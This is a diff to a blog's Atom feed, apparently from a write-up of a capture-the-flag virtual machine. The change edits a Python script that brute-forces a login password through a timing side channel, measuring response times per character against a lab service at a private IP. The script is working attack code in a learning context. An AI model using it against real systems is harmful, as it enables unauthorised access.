@@ -4,7 +4,7 @@
   <title><![CDATA[Category: vm's | FourFourFourFour]]></title>
   <link href="http://recrudesce.github.io/blog/categories/vms/atom.xml" rel="self"/>
   <link href="http://recrudesce.github.io/"/>
-  <updated>2015-01-06T13:15:37+00:00</updated>
+  <updated>2015-01-06T13:22:30+00:00</updated>
   <id>http://recrudesce.github.io/</id>
   <author>
     <name><![CDATA[recrudesce]]></name>
@@ -212,11 +212,11 @@ Average Response Time was  0.0055832862854
 <p>It is sensible to hazard a guess that the first character is &ldquo;R&rdquo;, due to it responding a lot quicker than all other characters attempted.  I then wrapped this into a script to brute the whole password</p>
 
 <pre><code class="python">#!/usr/bin/python
-import socket, time, string, numpy
+import socket, time, string, numpy, sys
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('172.16.231.133', 54311))
 data = s.recv(1024)
-
+print "Attempting to Brute Password Until Successful Login..."
 discovered = ''
 for charnum in range (0, 100):
 
@@ -244,16 +244,17 @@ for charnum in range (0, 100):
                 avg = [avg1, avg2, avg3, avg4, avg5]
                 letter_avg = numpy.mean(avg)
                 if letter_avg &lt; 0.001:
-                        print "Letter", charnum, "is", charact
+                        #print "Letter", charnum, "is", charact
                         discovered = discovered + charact
+                        sys.stdout.write('\rPassword Discovered: '+ discovered)
+                        sys.stdout.flush()
                         break
         if 'Invalid' in prompt:
                 meh = ''
         else:
-                print "Got a successful login !"
+                print "\nGot a successful login !  Use password above."
                 break;
 s.close()
-print "Password is: ", discovered
 </code></pre>
 
 <p>This script produces the following output</p>
